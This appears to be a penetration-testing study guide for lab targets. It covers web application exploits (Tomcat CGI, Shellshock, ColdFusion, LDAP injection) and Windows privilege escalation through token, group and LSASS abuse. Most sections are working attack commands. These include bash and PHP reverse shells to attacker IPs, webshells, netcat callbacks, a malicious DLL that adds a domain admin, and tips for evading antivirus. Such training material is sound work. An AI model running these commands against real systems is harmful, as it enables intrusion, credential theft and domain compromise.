12. Attacking Tomcat CGI (CVE-2019-0232)

Overview

CVE-2019-0232 — Remote Code Execution on Windows Tomcat instances where enableCmdLineArguments=true (default in older versions).

Affects: Tomcat 9.0.0.M1 – 9.0.17, 8.5.0 – 8.5.39, 7.0.0 – 7.0.93 on Windows only

How it works: CGI Servlet passes URL parameters directly to OS command line without proper validation. Batch command separator & allows injecting additional commands.

Enumeration

# Find Tomcat version
nmap -p- -sC -Pn 10.129.204.227 --open
# Look for: Apache Tomcat/9.0.17 on port 8080

# Find CGI scripts via ffuf
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat

Why search for .bat and .cmd: CGI scripts on Windows are batch files. You need to find one to have an injection point.

Exploitation

# Get environment variables (find PATH)
http://10.129.204.227:8080/cgi/welcome.bat?&set

# Execute dir command
http://10.129.204.227:8080/cgi/welcome.bat?&dir

# Execute whoami (hardcode path since PATH is unset)
# URL-encode the payload to bypass Tomcat's regex filter
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe

Why URL-encode: Tomcat added a patch with a regex filter blocking special characters. URL-encoding (%3A = :, %5C = \) bypasses this filter.

13. Shellshock via CGI (CVE-2014-6271)

Overview

Shellshock — A 25-year-old bug in Bash (GNU Bash ≤ 4.3) where environment variables could trigger arbitrary command execution. Exploitable through CGI scripts because web servers pass HTTP headers as environment variables to CGI programs.

Quick test:

env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
# If prints "vulnerable-shellshock" then "not vulnerable" → VULNERABLE
# If only prints "not vulnerable" → patched

Enumeration

# Find CGI scripts with Gobuster
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
# Look for scripts like access.cgi

Confirming Vulnerability

# Inject command via User-Agent header
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi

How the payload works:
- () { :;} — Define a function (this triggers the parser)
- ; — End of function definition
- The following command (/bin/cat /etc/passwd) executes because vulnerable Bash doesn't stop after the function

Getting a Reverse Shell

# Payload in User-Agent
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi

# Listener
sudo nc -lvnp 7777

14. Thick Client Applications

Overview

Thick client apps are installed locally (not web-based). They often contain hardcoded credentials or connection strings with database passwords.

Architecture types:
- Two-tier: App communicates directly with database
- Three-tier: App → Application server (HTTP/HTTPS) → Database (more secure)

Common vulnerabilities:
- Hardcoded credentials in source code or config files
- DLL Hijacking
- Buffer Overflow
- SQL Injection
- Insecure local storage

Tools for Analysis

Phase Tool Purpose
Info Gathering CFF Explorer, Detect It Easy Identify file type, architecture
Static Analysis Ghidra, IDA, dnSpy, JADX Reverse engineer / read source
Dynamic Analysis x64dbg, OllyDbg, Frida Runtime debugging, find in-memory strings
Network Wireshark, Burp Suite, TCPView Capture traffic between app and server
Process ProcMon64, Strings Monitor file/registry activity

Technique: Extract Credentials from Memory (x64dbg)

  1. Load the binary in x64dbg (Options → Preferences → uncheck all except Exit Breakpoint)
  2. Right-click in CPU view → Follow in Memory Map
  3. Look for MAP type with -RW-- protection (writable memory-mapped files)
  4. If you see MZ magic bytes → it's an embedded executable
  5. Right-click → Dump Memory to File
  6. Run strings on the dump
strings restart-service_00000000001E0000.bin
  1. If it's .NET, use de4dot to deobfuscate, then dnSpy to read source code

Technique: Intercept SQL Queries in GDB

gdb ./octopus_checker
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main
# Look for SQLDriverConnect call address, e.g.: 0x5555555551b0
gdb-peda$ b *0x5555555551b0
gdb-peda$ run
# When breakpoint hits, check RDX register for connection string:
# "DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost,1401;UID=username;PWD=password;"

15. ColdFusion

Overview

  • Java-based web development platform by Adobe
  • Uses CFML (ColdFusion Markup Language) — HTML-like syntax
  • File extensions: .cfm, .cfc
  • Default ports: 80 (HTTP), 443 (HTTPS), 8500 (SSL), 1935 (RPC), 5500 (Server Monitor)
  • Admin panel: /CFIDE/administrator/index.cfm

Discovery

nmap -p- -sC -Pn 10.129.247.30 --open
# Look for port 8500 (fmtp)
# Browse to http://IP:8500 → should see CFIDE and cfdocs directories

# Find installed version via admin panel
# http://IP:8500/CFIDE/administrator/index.cfm → Shows "ColdFusion 8 Administrator"

CVE-2010-2861 — Directory Traversal

Affects: ColdFusion 9.0.1 and earlier

# Find and use the exploit
searchsploit adobe coldfusion
searchsploit -p 14641
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .

# Exploit — read password.properties file
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

What password.properties contains: Encrypted passwords for database connections, mail servers, LDAP. The password= field is an MD5/SHA hash that can be cracked.

Vulnerable endpoints: CFIDE/administrator/settings/mappings.cfm, logging/settings.cfm, datasources/index.cfm, CFIDE/administrator/enter.cfm

CVE-2009-2265 — Unauthenticated RCE (FCKeditor)

Affects: ColdFusion 8.0.1 and earlier

searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .

# Edit the script variables:
# lhost = '10.10.14.55'
# lport = 4444
# rhost = "10.129.247.30"
# rport = 8500

python3 50057.py
# Script generates payload, uploads it, executes it, returns shell

16. IIS Tilde Enumeration

Overview

IIS (old versions) generates 8.3 short filenames (e.g., LONGFI~1.TXT for LongFileName.txt). A vulnerability allows enumerating these short names via HTTP requests with ~ character, even for "hidden" files.

Format: ~1 after first 6 chars. If two files start the same, the second gets ~2.

Enumeration with IIS-ShortName-Scanner

java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
# Output shows short names like TRANSF~1.ASP

🔗 Tool: https://github.com/irsdl/IIS-ShortName-Scanner

Generate Wordlist and Brute Force

# Create wordlist from dirb matching the short name prefix
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt

# Brute force with gobuster
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
# Finds the full filename: /transfer*.aspx

17. LDAP & LDAP Injection

Overview

LDAP (Lightweight Directory Access Protocol) — protocol for accessing directory services. Default port: 389 (LDAP), 636 (LDAPS).

Used for authentication, authorization, user management. Two common implementations: OpenLDAP and Microsoft Active Directory.

LDAP Injection

Similar to SQL injection, but targets LDAP queries. Web apps that use LDAP for auth are vulnerable if input isn't sanitized.

Special characters to test:
- * — Wildcard, matches any value
- ( ) — Group expressions
- & — Logical AND

Bypass authentication:

Username: *
Password: *

This creates a query like:

(&(objectClass=user)(sAMAccountName=*)(userPassword=*))

The * wildcard matches anything, granting access to the first (or any) account.

Enumeration

nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
# Look for: ldap OpenLDAP on port 389, http Apache on port 80

If a web app runs on 80 alongside OpenLDAP on 389, the web app almost certainly uses LDAP for auth. Try * in login fields.

18. Web Mass Assignment Vulnerabilities

Overview

Mass assignment allows setting multiple object attributes at once from user input. When developers don't whitelist allowed fields, attackers can set sensitive attributes (like admin=true) that shouldn't be user-modifiable.

Affected frameworks: Ruby on Rails, Laravel, Spring, Node.js (Mongoose), and others.

Example Attack (Ruby on Rails)

If a registration form sends:

POST /register
username=hacker&password=test123

Attacker modifies request (via Burp) to add:

username=hacker&password=test123&admin=true

If the model allows mass assignment of admin, the attacker is now an admin.

Bypassing Pending Approval in Flask App

If source code shows:

try:
    if request.form['confirmed']:
        cond=True
except:
    cond=False

Add confirmed=1 to the registration POST request to bypass admin approval:

POST /register
username=newuser&password=test&confirmed=test

Using Burp Suite: Capture the registration POST → add &confirmed=test to the body → forward.

21. Application Hardening

General Hardening Checklist

  • ✅ Change all default passwords immediately after installation
  • ✅ Disable default admin accounts, create custom ones
  • ✅ Enable 2FA for admin accounts (and all users where possible)
  • ✅ Restrict admin panels to internal network only (not internet-facing)
  • ✅ Apply updates and patches regularly
  • ✅ Configure regular automated backups to secondary location
  • ✅ Implement Web Application Firewall (WAF)
  • ✅ Enforce strong password policies
  • ✅ Use principle of least privilege throughout

Application-Specific Hardening

App Key Hardening Action
WordPress Install WordFence plugin; disable PHP editing in theme editor
Joomla Use AdminExile plugin to require secret key for admin login
Drupal Disable/hide/move the admin login page
Tomcat Restrict /manager and /host-manager to localhost only
Jenkins Configure Matrix Authorization Strategy plugin
Splunk Keep licensed (free version has no auth); change default password
PRTG Change default prtgadmin:prtgadmin password; keep updated
osTicket Don't expose to internet if possible
GitLab Require admin approval for new sign-ups; restrict allowed email domains; enforce 2FA

All commands from the official cheat sheet with detailed explanations.

/etc/hosts Management

sudo vim /etc/hosts

Purpose: Add virtual host entries when lab environments use hostnames instead of direct IPs.

Nmap Web Discovery

sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

Why this port list: Covers standard web ports plus common app-specific ports (Tomcat, Splunk, etc.). --open filters to only active services. -oA saves XML for tool integration.

Input: Nmap XML → Output: HTML report with screenshots, categories, and default credential suggestions.

WPScan — WordPress Enumeration

Enumerates: Plugins, themes, users, backups, media. Use --api-token for vulnerability data.

WPScan — WordPress Password Attack

sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://domainname

xmlrpc method is faster than wp-login because it batches requests via the WordPress API.

WordPress Webshell Execution via curl

curl -s http://<hostname>/path/to/webshell.php?cmd=id

After: Edit the theme's PHP file to add system($_GET[0]); then access it with ?0=<command>.

WordPress PHP Reverse Shell

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'");

Add to a WordPress theme PHP file. Start nc -lnvp <port> first.

droopescan scan joomla --url http://domainname

Finds: Version range, interesting URLs (admin panel, license), accessible components.

Joomla Brute Force

sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

Drupal PHP Webshell Code

<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>

Used in: PHP Filter module node content, or uploaded backdoored module.

Drupal Webshell Execution via curl

curl -s http://domainname/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

cut -f4 -d">": Splits the HTML output by > character and takes the 4th field to extract just the uid=33(www-data) part cleanly.

Gobuster Directory Brute Force

gobuster dir -u http://domainname -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

Use case: Finding Tomcat's /manager path, CGI scripts, hidden directories.

Post-Exploitation/Module 26

Windows Privilege Escalation

1. Introduction & Why PrivEsc Happens

After gaining a foothold, privilege escalation lets you:
- Access sensitive local resources (databases, credential files)
- Obtain NT AUTHORITY\SYSTEM or Local Admin — required for many post-exploitation tasks
- Gain a foothold into Active Directory (dump hashes, move laterally)
- Achieve the ultimate goal in "gold image" / "workstation breakout" assessments

Common PrivEsc Vectors:
- Abusing Windows group privileges
- Abusing Windows user privileges (tokens/rights)
- Bypassing User Account Control (UAC)
- Abusing weak service/file permissions
- Leveraging unpatched kernel exploits
- Credential theft
- Traffic capture
- DLL hijacking

Real-World Scenarios from HTB

Scenario 1 – Network Restrictions:
No internet, blocked USB, but printer VLAN allowed ports 80/443/445. Found a permissions flaw → manually dumped LSASS → exfiltrated dump over SMB to attack machine → extracted DA hash with Mimikatz → cracked offline → accessed domain controller.

Scenario 2 – Pillaging Open Shares:
Found a wide-open share with .VMDK/.VHDX VM backups. Mounted VHDX → extracted SYSTEM/SAM/SECURITY registry hives → ran secretsdump.py → got local admin hash → pass-the-hash across the entire gold-image domain.

Scenario 3 – Credential Abuse + SeImpersonate:
Used Snaffler to find .sql files with DB credentials → connected to MSSQL → enabled xp_cmdshell → confirmed SeImpersonatePrivilege → used Juicy Potato → added local admin.

Why PrivEsc Flaws Exist:
- Understaffed IT teams; can't keep up with patching
- Budget constraints — no internal security assessments
- File share audits not performed (credentials sitting in scripts/configs)
- Gold image deployed everywhere → one hash = domain-wide access

2. Useful Tools

Location on target: C:\Tools\ (pre-placed on HTB lab machines)
Safe upload path: C:\Windows\Temp — BUILTIN\Users always has write access here

Tool What it does Link
Seatbelt C# project; runs a wide variety of local PrivEsc checks GitHub
winPEAS Searches for possible PrivEsc paths; comprehensive output GitHub
PowerUp PowerShell script; finds misconfigurations and can exploit some GitHub
SharpUp C# port of PowerUp GitHub
JAWS PowerShell PrivEsc enumeration; written in PS 2.0 GitHub
SessionGopher PowerShell; decrypts saved PuTTY/WinSCP/FileZilla/RDP sessions GitHub
Watson .NET tool; enumerates missing KBs and suggests exploits GitHub
LaZagne Retrieves passwords from browsers, chat, databases, Git, email, etc. GitHub
WES-NG Windows Exploit Suggester - Next Generation; based on systeminfo output GitHub
Sysinternals Suite AccessChk, PipeList, PsService, ProcDump, etc. Microsoft

⚠️ AV Evasion Note: Tools like LaZagne are detected by 47/70 AV products. In client environments, always compile from source and consider obfuscation techniques (rename functions, strip comments, encrypt). This module assumes Windows Defender is temporarily disabled on lab targets.

3. Initial Enumeration – Situational Awareness

Connecting to Lab Targets

# Connect via RDP from Linux attack box (FreeRDP)
xfreerdp /v:<target_ip> /u:htb-student
# Enter password when prompted. Accept certificate with 'Y'

Why: All HTB CPTS lab targets use RDP. FreeRDP is the standard Linux RDP client.

Network Information

Why gather network info? You might be on a dual-homed host (connected to multiple networks). This could give you access to network segments you couldn't reach directly. ARP cache reveals other hosts recently communicating with this machine — potential lateral movement targets.

ipconfig /all

Shows all network interfaces, IP addresses, DNS servers, DHCP info. Look for multiple interfaces — that's your dual-homed indicator. Note the domain name — tells you if the host is domain-joined.

arp -a

Shows the ARP cache — IP-to-MAC mappings of hosts this machine recently talked to. Useful for identifying other machines to pivot to, especially domain controllers or admin workstations.

route print

Shows routing table. Look for routes to other subnets you couldn't reach from your attack box. Static/persistent routes are especially interesting — may indicate intentional access to isolated segments.

Enumerating Protections

Get-MpComputerStatus

Checks Windows Defender status. Shows if real-time protection is on, last scan time, signature version. Why it matters: If AV is active you need to be careful which tools you run — many will be caught immediately.

# List all active AppLocker rules
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

AppLocker is Microsoft's application whitelisting solution. It can block cmd.exe, powershell.exe, or specific file types from running. Understanding the rules helps you plan bypasses before running tools.

# Test whether a specific binary is allowed by AppLocker
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

Tests if a specific binary is allowed for Everyone. Use this to check if your tools/payloads will be blocked before executing them.

System Information

set

Prints all environment variables. Key things to look for:
- PATH — if a writable folder is listed before C:\Windows\System32, you can do DLL hijacking
- HOMEDRIVE — in enterprises, this is often a file share that may contain sensitive files
- USERDOMAIN — tells you the domain name

systeminfo

Comprehensive system info: OS version, build, hotfixes installed, number of NICs, boot time. What to look for:
- Hotfixes list — cross-reference with known CVEs. Few/no patches = likely vulnerable
- If box hasn't rebooted in 6+ months, it's probably not being patched
- "Hyper-V Requirements" line tells you if it's a VM
- Domain info tells you if it's domain-joined

wmic qfe

Lists all installed patches/hotfixes (Quick Fix Engineering). Use this if systeminfo doesn't show hotfixes. Cross-reference KB numbers with known exploits.

# PowerShell equivalent for hotfixes
Get-HotFix | ft -AutoSize

wmic product get name

Lists all installed software. Look for: FileZilla, PuTTY, mRemoteNG, WinSCP — run LaZagne/SessionGopher to pull stored credentials. Also look for vulnerable versions of software running as services.

# PowerShell equivalent
Get-WmiObject -Class Win32_Product | select Name, Version

tasklist /svc

Lists all running processes and the services associated with them. What to look for: Non-standard processes (not the usual Windows ones like svchost, lsass, winlogon). FileZilla Server? MSSQL? XAMPP? These could be attack vectors. Cross-reference PIDs with netstat output.

set
# Look at the PATH variable specifically
cmd /c echo %PATH%

Review the PATH variable. If a user-writable directory (like C:\Users\<user>\AppData\) appears before system directories, this is a DLL hijacking / UAC bypass opportunity.

4. User & Group Information

Why enumerate users? Systems may be well-patched but have a weak user with browsable home directory containing logins.xlsx. Understanding group membership reveals indirect privileges.

query user

Shows currently logged-in users, their session type (RDP, console), and idle time. Why: If admins are actively logged in and working, their credentials might be in memory (LSASS). Also tells you if other users are active — avoid noisy actions that might alert them.

echo %USERNAME%

Simply shows the current username. First thing to check after gaining a shell.

whoami /priv

Shows all privileges assigned to your current token. Critical command — many PrivEsc paths depend on specific privileges being present (even if Disabled — some can be re-enabled). Look for:
- SeImpersonatePrivilege → Potato attacks → SYSTEM
- SeDebugPrivilege → LSASS dump → credentials
- SeTakeOwnershipPrivilege → own any file
- SeBackupPrivilege → read any file
- SeLoadDriverPrivilege → load kernel drivers
- SeRestorePrivilege → write any file

whoami /groups

Shows all groups your user belongs to, including well-known groups and integrity levels. Look for:
- BUILTIN\Backup Operators → SeBackupPrivilege + SeRestorePrivilege
- BUILTIN\Print Operators → SeLoadDriverPrivilege
- BUILTIN\Server Operators → can modify/start services
- INLANEFREIGHT\DnsAdmins → DLL injection via DNS service
- Hyper-V Administrators → access VM files
- Medium Mandatory Level vs High Mandatory Level → tells you if UAC bypass is needed

net user

Lists all local user accounts on the system. Note unusual accounts — service accounts, old accounts, or accounts with interesting names.

net localgroup

Lists all local groups. Non-standard groups may hint at installed software, organizational structure, or misconfigurations.

net localgroup administrators

Shows who has local admin rights. This is your target — you want to be in this group or SYSTEM.

net accounts

Shows password policy: minimum length, max age, lockout threshold. Why: If lockout threshold is "Never", you can brute-force local accounts without getting locked out.

netstat -ano

Lists all active TCP/UDP connections with PID. What to look for:
- Services listening only on 127.0.0.1 or ::1 (localhost) — often less secure because developers assume "it's not accessible remotely"
- Port 1433 (MSSQL), port 8080 (web), non-standard ports
- Cross-reference PIDs with tasklist /svc to identify which service owns which port
- Example: Port 14147 = FileZilla admin interface → can extract FTP creds

5. Communication with Processes & Named Pipes

Access Tokens

Windows uses access tokens to describe the security context of a process. When you authenticate, you get an access token. Processes use this token to access resources. Key concept: SeImpersonatePrivilege lets a process impersonate another user's token — the basis for Potato attacks.

Named Pipes

Named pipes are an IPC (inter-process communication) mechanism — essentially files in memory that get cleared after reading. Cobalt Strike uses named pipes extensively. Misconfigured pipe permissions can allow PrivEsc.

# List named pipes using Sysinternals PipeList
pipelist.exe /accepteula

Shows all named pipes currently open on the system. Look for pipes belonging to high-privilege processes.

# PowerShell equivalent
gci \\.\pipe\

# Check permissions on a specific named pipe (e.g., lsass pipe)
accesschk.exe /accepteula \\.\Pipe\lsass -v

Shows who can read/write to the LSASS named pipe. If low-privilege users can interact with SYSTEM pipes, that's a PrivEsc opportunity.

6. Windows User Privileges

Windows has many configurable user rights. Full reference: Microsoft User Rights Assignment

The key dangerous privileges from a PrivEsc perspective:

Privilege Why It Matters
SeImpersonatePrivilege Impersonate any user → SYSTEM via Potato attacks
SeAssignPrimaryTokenPrivilege Replace process token → similar to SeImpersonate
SeDebugPrivilege Read/write memory of any process → dump LSASS
SeTakeOwnershipPrivilege Own any file/object → read sensitive files
SeBackupPrivilege Bypass file ACLs for backup → read anything
SeRestorePrivilege Bypass file ACLs for restore → write anything
SeLoadDriverPrivilege Load/unload kernel drivers → load vulnerable driver
SeCreateTokenPrivilege Create access tokens → create token with any group
SeMachineAccountPrivilege Add computers to domain (up to 10 by default)

Note: Privileges shown as "Disabled" in whoami /priv can sometimes be re-enabled programmatically. Always check even disabled privileges.

7. SeImpersonatePrivilege – Potato Attacks

When Do You Have This?

Commonly found on MSSQL service accounts, IIS web server accounts, and other service accounts. Any process that implements impersonation has this privilege.

Confirming via MSSQL

# Connect to MSSQL from attack box using Impacket
mssqlclient.py sql_dev@10.129.43.30 -windows-auth

mssqlclient.py is part of Impacket — Python toolkit for Windows network protocols. -windows-auth uses Windows authentication instead of SQL auth. After connecting you get an SQL prompt.

-- Inside mssqlclient, enable OS command execution
enable_xp_cmdshell

xp_cmdshell is a SQL Server stored procedure that lets you run OS commands. Disabled by default but can be enabled by sysadmin. Why: Once enabled, every OS command runs as the SQL service account.

-- Run OS command via SQL
xp_cmdshell whoami /priv

Confirm SeImpersonatePrivilege is present. If it's there, you can escalate to SYSTEM.

JuicyPotato (Windows Server 2016 and earlier, Windows 10 < build 1809)

c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *

Flags:
- -l 53375 → COM server listening port (any unused port)
- -p → program to launch (cmd.exe here)
- -a → arguments to pass to cmd.exe (spawning nc reverse shell)
- -t * → try both CreateProcessWithTokenW AND CreateProcessAsUser

How it works: Tricks a SYSTEM process into connecting to your controlled COM server, hands over the SYSTEM token, then uses SeImpersonate to create a new process with that SYSTEM token.

Set up listener first: sudo nc -lnvp 443

PrintSpoofer (Windows 10 build 1809+, Server 2019)

JuicyPotato doesn't work on newer systems. Use PrintSpoofer instead.

c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

-c specifies the command to run. PrintSpoofer abuses the Print Spooler service to obtain a SYSTEM token. Works on Windows 10 build 1809+ and Server 2019 where JuicyPotato fails.

Reference: PrintSpoofer blog

Next step after SYSTEM shell: Dump credentials, add persistence, access NTDS.dit, etc.

8. SeDebugPrivilege – LSASS Dump

Who Has This?

Assigned via Group Policy (Computer Settings → Windows Settings → Security Settings → Local Policies → User Rights Assignment). By default only administrators have it. Developers sometimes get it for debugging.

Confirming the Privilege

whoami /priv
# Look for: SeDebugPrivilege    Debug programs    Disabled

Even if shown as "Disabled," you can often re-enable it programmatically using tools like Mimikatz.

Dumping LSASS with ProcDump

procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump is a Sysinternals tool. -accepteula suppresses the EULA prompt. -ma means full memory dump. lsass.exe is the target (Local Security Authority Subsystem Service — stores credentials of logged-in users in memory).

Result: Creates a lsass.dmp file you can analyze offline.

Extracting Credentials with Mimikatz

# Open Mimikatz, then:
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

sekurlsa::minidump points Mimikatz at the dump file instead of live LSASS.
sekurlsa::logonpasswords extracts NTLM hashes and plaintext passwords (if WDigest is enabled) for all sessions in the dump.

➜ What you get Usernames, NTLM hashes, potentially cleartext passwords, Kerberos tickets. Use NTLM hashes for pass-the-hash attacks.

Useful references: Mimikatz wiki, gentilkiwi blog

9. SeTakeOwnershipPrivilege

Allows taking ownership of any file or object on the system, regardless of ACLs. Can lead to RCE, access to sensitive data, or DoS.

Check for the privilege:

whoami /priv
# Look for: SeTakeOwnershipPrivilege    Take ownership of files or other objects    Disabled

Step-by-Step: Reading a Protected File

# 1. Check file ownership before taking it
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

If the Owner column is blank, you don't have permission to even view the owner — the file is heavily restricted.

# 2. Take ownership of the file
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
# Output: SUCCESS: The file now owned by "WINLPE-SRV01\htb-student"

/f specifies the file path. Use /r /d y for recursive directory ownership.

# 3. Confirm ownership changed
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

# 4. Grant yourself full permissions (ownership alone doesn't give read access)
icacls "C:\Department Shares\Private\IT\cred.txt" /grant htb-student:F

icacls modifies ACLs. /grant username:F grants full control (F). Now you can read the file.

Remember to revert: After the engagement, restore original permissions and ownership. Document any changes in your report.

Files Worth Targeting

c:\inetpub\wwwroot\web.config       # IIS connection strings (DB passwords)
%WINDIR%\repair\sam                  # SAM hive (local account hashes)
%WINDIR%\repair\system               # SYSTEM hive (needed to decrypt SAM)
%WINDIR%\repair\software             # Software hive
%WINDIR%\repair\security             # Security hive
C:\ProgramData\Configs\*            # App configs (often have creds)
C:\Program Files\Windows PowerShell\* # PowerShell scripts

10. SeBackupPrivilege – Backup Operators Group

Members of the Backup Operators group get SeBackupPrivilege and SeRestorePrivilege. These bypass normal file ACLs for backup/restore purposes — meaning you can read ANY file, including NTDS.dit.

Check group membership:

whoami /groups
# Look for: BUILTIN\Backup Operators

Enabling and Using SeBackupPrivilege

# Import the required PowerShell modules (need these DLLs on target)
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Check current state
Get-SeBackupPrivilege
# If disabled:
Set-SeBackupPrivilege

# Verify it's now enabled
whoami /priv

# Copy a protected file using the backup privilege
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
cat .\Contract.txt

This bypasses the ACL because FILE_FLAG_BACKUP_SEMANTICS is set, telling Windows this is a backup operation.

Attacking a Domain Controller — Stealing NTDS.dit

NTDS.dit is the Active Directory database containing NTLM hashes for all domain users and computers. It's locked by a running AD process, so you need a shadow copy.

# Step 1: Create a shadow copy of C: using diskshadow
diskshadow.exe

# Inside diskshadow interactive prompt:
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

This creates a volume shadow copy of C: and mounts it as E:. The NTDS.dit on E: is not locked by the running AD process.

# Step 2: Copy NTDS.dit from the shadow copy
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

# Step 3: Back up SAM and SYSTEM hives (needed together with NTDS.dit)
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

# Alternative: Use robocopy in backup mode
robocopy /B E:\Windows\NTDS .\ntds ntds.dit

/B flag = backup mode, bypasses ACLs.

# Step 4: Back on attack box — extract all hashes
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

Impacket's secretsdump.py decrypts the NTDS.dit using the SYSTEM hive (contains the boot key). Outputs all domain user NTLM hashes. Use for offline cracking or pass-the-hash.

11. Windows Group Privileges

Event Log Readers Group

Members can read Windows Security event logs — which may contain cleartext passwords in process creation events (Event ID 4688).

# Search security event log for '/user' strings (may reveal credentials)
wevtutil qe Security /rd:true /f:text | Select-String "/user"

# Search on a remote host with credentials
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"

wevtutil qe Security queries the Security event log. /rd:true reads in reverse order (newest first). /f:text outputs as text. Pipe through Select-String to filter for password-containing lines.

# PowerShell: search for process creation events with /user in command line
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

Event ID 4688 = Process Creation. If command-line logging is enabled, you might see commands like net use /user:admin password123.

DnsAdmins Group

Members can configure the DNS server to load custom DLL plugins. DNS runs as NT AUTHORITY\SYSTEM on domain controllers — making this a full domain compromise path.

Attack flow:

# Step 1: On attack box — create malicious DLL that adds domain admin user
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

# Host it on a Python HTTP server
python3 -m http.server 7777

# Step 2: On target — download the malicious DLL
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"

# Step 3: Find your user's SID
wmic useraccount where name="netadm" get sid

# Step 4: Configure DNS to load your DLL (must be full path!)
dnscmd.exe /config /serverlevelplugindll adduser.dll

Only DnsAdmins members can run this. It sets HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll to your DLL path. The DLL loads when DNS restarts.

# Step 5: Check your permissions on the DNS service
sc.exe sdshow DNS

If you have RPWP (start/stop) rights, you can restart DNS yourself. Otherwise wait for a restart.

# Step 6: Restart DNS to trigger DLL load
sc stop dns
sc start dns

# Step 7: Query the registry to confirm DLL path was set
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

# Step 8: After DLL executes, clean up the registry key
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll

# Also useful: Disable the global query block list (prevents WPAD/ISATAP blocking)
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local

# Add a WPAD record for MITM attacks
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3

Hyper-V Administrators Group

Members can access and manage Hyper-V virtual machines, including their .vhdx files. This can lead to Domain Admin compromise by offline NTDS.dit extraction.

# Mount a VMDK file on Linux
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd

# Mount a VHDX file on Linux
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1

After mounting, browse the filesystem → extract SAM/SYSTEM/SECURITY hives → run secretsdump.py.

Server Operators Group

Members have SERVICE_ALL_ACCESS on many services — meaning they can modify service binary paths and start/stop services.

Attack flow:

# Step 1: Find a service running as SYSTEM that Server Operators can control
# Example: AppReadiness service
sc qc AppReadiness

# Step 2: Check permissions with PsService
c:\Tools\PsService.exe security AppReadiness
# Look for: [ALLOW] BUILTIN\Server Operators - All

# Step 3: Modify the service binary path to execute your command
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

This replaces the legitimate binary path with a command that adds your user to local admins.

# Step 4: Start the service (it will "fail" but your command runs first)
sc start AppReadiness
# Error is expected — service can't start because binpath isn't a real service
# But the command already ran!

# Step 5: Verify you're now a local admin
net localgroup Administrators

# Step 6: From attack box — confirm access and dump DC hashes
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
# (Pwn3d!) = local admin confirmed

